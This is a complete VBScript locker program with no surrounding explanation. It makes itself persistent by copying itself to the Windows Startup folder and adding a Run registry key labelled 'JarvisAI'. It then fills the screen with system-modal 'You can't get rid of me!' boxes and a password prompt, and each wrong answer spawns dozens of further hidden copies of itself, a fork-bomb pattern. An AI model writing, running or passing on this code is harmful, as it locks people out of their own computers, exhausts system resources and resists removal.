Dim fso, startupFolder, scriptPath, startupPath, objShell

Set fso = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

startupFolder = objShell.SpecialFolders("Startup")
scriptPath = WScript.ScriptFullName
startupPath = startupFolder & "\lock.vbs"

Sub CreatePersistence()
    On Error Resume Next
    If Not fso.FileExists(startupPath) Then
        fso.CopyFile scriptPath, startupPath, True
    End If

    objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\JarvisAI", "wscript.exe """ & scriptPath & """", "REG_SZ"
    On Error GoTo 0
End Sub

Sub SpawnCopies(count)
    Dim i
    For i = 1 To count
        objShell.Run "wscript.exe """ & scriptPath & """", 0, False
    Next
End Sub

CreatePersistence
SpawnCopies 5

password = "pasword1234385728785"
attempts = 0
maxAttempts = 1

Do
    MsgBox "You can't get rid of me!", vbExclamation + vbSystemModal, "Warning"
    pass = InputBox("Enter password to close tab:", "Security check")

    If pass = password Then
        MsgBox "Access granted!", vbInformation + vbSystemModal, "Success"
        Exit Do
    Else
        attempts = attempts + 1

        If attempts >= maxAttempts Then
            MsgBox "Too many incorrect attempts. Locked out for 5 minutes.", vbCritical + vbSystemModal, "Locked"
            WScript.Sleep 5 * 60 * 1000
            attempts = 0
        Else
            MsgBox "Incorrect password! Attempts left: " & (maxAttempts - attempts), vbCritical + vbSystemModal, "Error"
        End If

        SpawnCopies 50
        MsgBox "Warning: You have 30 seconds before more screens appear.", vbExclamation + vbSystemModal, "Watch out"
        WScript.Sleep 30 * 1000
        SpawnCopies 25
    End If
Loop